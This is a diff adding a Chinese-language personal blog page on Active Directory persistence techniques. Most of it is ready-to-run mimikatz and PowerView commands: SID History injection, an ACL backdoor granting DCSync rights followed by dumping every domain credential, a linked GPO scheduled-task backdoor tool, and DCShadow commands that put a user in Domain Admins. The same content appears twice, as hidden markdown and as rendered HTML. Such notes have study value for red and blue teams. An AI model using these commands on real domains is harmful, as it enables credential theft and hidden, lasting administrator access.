@@ -1,0 +1,270 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="Keywords" content="blog"/>
+    <meta name="Description" content="blog"/>
+    <title>Simple</title>
+    <link rel="shortcut icon" href="/static/favicon.png"/>
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+</head>
+<body>
+<div class="main">
+    <div class="header">
+    	<ul id="pages">
+            <li><a href="/">home</a></li>
+            <li><a href="/#/tags">tags</a></li>
+            <li><a href="/#/archive">archive</a></li>
+    	</ul>
+    </div>
+	<div class="wrap-header">
+    <h1>
+    <a href="/" id="title"></a>
+    </h1>
+	</div>
+<xmp id="md" style="display: none;">
+<!-- markdown -->
+域内环境中常用的维持权限的方式.
+
+## 金银票据
+
+[Golden and Silver Ticket](https://exp10it.cn/golden-and-silver-tickets.html).
+
+## SID History
+
+SID History 为域内用户迁移到新域时针对用户权限的转移而提供的一种手段.
+
+通过 SID History 可让用户拥有不同身份的权限, 在单域中同样有效.
+
+```
+mimikatz "privilege::debug" "sid::patch" "sid::add /new:admin-sid /sam:test" "exit"
+```
+
+注意要先进行 `sid::patch`, 否则会出现 `ERROR kuhl_m_sid_add;ldap_modify_s 0x32 (50)` 错误.
+
+清除 SID History.
+
+```
+mimikatz "privilege::debug" "sid::patch" "sid::clear /sam:test" "exit"
+```
+
+## ACL 后门
+
+ACL 全称 Access Control List, 即访问控制列表. 故 ACL 后门, 是指针对权限配置缺陷的后门.
+
+### DCSync
+
+ACL 后门的 DCSync 形式.
+
+```
+Import-Module .\PowerView.ps1
+Add-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test -Rights DCSync
+```
+
+这样在任意一台主机上以 test 用户登录都能通过 DCSync 向域控请求账户凭据.
+
+```
+mimikatz "lsadump::dcsync /all" "exit"
+```
+
+删除 DCSync 后门.
+
+```
+Remove-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test -Rights DCSync
+```
+
+### GPO
+
+ACL 后门的 GPO 形式.
+
+通过在组策略管理中添加计划任务批量设置后门.
+
+暂且只给出利用工具, 尚未测试成功.
+
+[3gstudent/New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1).
+
+## DCShadow
+
+通过伪造 DC 并与正常 DC 同步数据的方式修改账户信息. 需要本地系统及域管理员权限.
+
+无需登录 DC, 且只会留下 Directory Service Access 日志, 缺点是可执行的操作较少.
+
+需要将 mimikatz 提升为 system 权限, 通过 mimidrv.sys 实现.
+
+```
+!+
+!processtoken
+```
+
+修改管理员组.
+
+```
+lsadump::dcshadow /object:CN=test,CN=Users,DC=test,DC=com /attribute:primarygroupid /value:512
+```
+
+添加 SID History.
+```
+lsadump::dcshadow /object:CN=test,CN=Users,DC=test,DC=com /attribute:sidhistory /value:admin-sid
+```
+
+最后以域管理员权限启动另一个 mimikatz 进程.
+
+```
+lsadump::dcshadow /push
+```
+<!-- markdown end -->
+</xmp>
+<div class="entry" id="main">
+<!-- content -->
+<p>域内环境中常用的维持权限的方式.</p>
+
+<h2 id="">金银票据</h2>
+
+<p><a href="https://exp10it.cn/golden-and-silver-tickets.html">Golden and Silver Ticket</a>.</p>
+
+<h2 id="sidhistory">SID History</h2>
+
+<p>SID History 为域内用户迁移到新域时针对用户权限的转移而提供的一种手段.</p>
+
+<p>通过 SID History 可让用户拥有不同身份的权限, 在单域中同样有效.</p>
+
+<pre><code>mimikatz "privilege::debug" "sid::patch" "sid::add /new:admin-sid /sam:test" "exit"
+</code></pre>
+
+<p>注意要先进行 <code>sid::patch</code>, 否则会出现 <code>ERROR kuhl_m_sid_add;ldap_modify_s 0x32 (50)</code> 错误.</p>
+
+<p>清除 SID History.</p>
+
+<pre><code>mimikatz "privilege::debug" "sid::patch" "sid::clear /sam:test" "exit"
+</code></pre>
+
+<h2 id="acl">ACL 后门</h2>
+
+<p>ACL 全称 Access Control List, 即访问控制列表. 故 ACL 后门, 是指针对权限配置缺陷的后门.</p>
+
+<h3 id="dcsync">DCSync</h3>
+
+<p>ACL 后门的 DCSync 形式.</p>
+
+<pre><code>Import-Module .\PowerView.ps1
+Add-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test -Rights DCSync
+</code></pre>
+
+<p>这样在任意一台主机上以 test 用户登录都能通过 DCSync 向域控请求账户凭据.</p>
+
+<pre><code>mimikatz "lsadump::dcsync /all" "exit"
+</code></pre>
+
+<p>删除 DCSync 后门.</p>
+
+<pre><code>Remove-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test -Rights DCSync
+</code></pre>
+
+<h3 id="gpo">GPO</h3>
+
+<p>ACL 后门的 GPO 形式.</p>
+
+<p>通过在组策略管理中添加计划任务批量设置后门.</p>
+
+<p>暂且只给出利用工具, 尚未测试成功.</p>
+
+<p><a href="https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1">3gstudent/New-GPOImmediateTask</a>.</p>
+
+<h2 id="dcshadow">DCShadow</h2>
+
+<p>通过伪造 DC 并与正常 DC 同步数据的方式修改账户信息. 需要本地系统及域管理员权限.</p>
+
+<p>无需登录 DC, 且只会留下 Directory Service Access 日志, 缺点是可执行的操作较少.</p>
+
+<p>需要将 mimikatz 提升为 system 权限, 通过 mimidrv.sys 实现.</p>
+
+<pre><code>!+
+!processtoken
+</code></pre>
+
+<p>修改管理员组.</p>
+
+<pre><code>lsadump::dcshadow /object:CN=test,CN=Users,DC=test,DC=com /attribute:primarygroupid /value:512
+</code></pre>
+
+<p>添加 SID History.</p>
+
+<pre><code>lsadump::dcshadow /object:CN=test,CN=Users,DC=test,DC=com /attribute:sidhistory /value:admin-sid
+</code></pre>
+
+<p>最后以域管理员权限启动另一个 mimikatz 进程.</p>
+
+<pre><code>lsadump::dcshadow /push
+</code></pre>
+<!-- content end -->
+</div>
+<br>
+<br>
+    <div id="disqus_thread"></div>
+	<div class="footer">
+		<p>© Copyright 2017-2019 by X1r0z</p>
+	</div>
+</div>
+<script src="main.js"></script>
+<script id="content" type="text/mustache">
+    <h1>{{title}}</h1>
+    <div class="tag">
+    {{date}}
+    {{#tags}}
+    <a href="/#/tag/{{name}}">#{{name}}</a>
+    {{/tags}}
+    </div>
+</script>
+<script id="pagesTemplate" type="text/mustache">
+    {{#pages}}
+    <li>
+        <a href="{{path}}">{{title}}</a>
+    </li>
+    {{/pages}}
+</script>
+<script>
+$(document).ready(function() {
+    $.ajax({
+        url: "main.json",
+        type: "GET",
+        dataType: "json",
+        success: function(data) {
+            $("#title").html(data.name);
+            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
+            var pagesHtml = pagesTemplate.render({"pages": data.pages});
+            $("#pages").append(pagesHtml);
+            //path
+            var path = "activedirectory-persistence.html";
+            //path end
+            var now = 0;
+            for (var i = 0; i < data.posts.length; ++i)
+                if (path == data.posts[i].path)
+                    now = i;
+            var post = data.posts[now];
+            var tmp = post.tags.split(" ");
+            var tags = [];
+            for (var i = 0; i < tmp.length; ++i)
+                if (tmp[i].length > 0)
+                    tags.push({"name": tmp[i]});
+            var contentTemplate = Hogan.compile($("#content").html());
+            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
+            $("#main").prepend(contentHtml);
+            if (data.disqus_shortname.length > 0) {
+                var disqus_shortname = data.disqus_shortname;
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            }
+        }
+    });
+});
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
+</script>
+</body>
+</html>
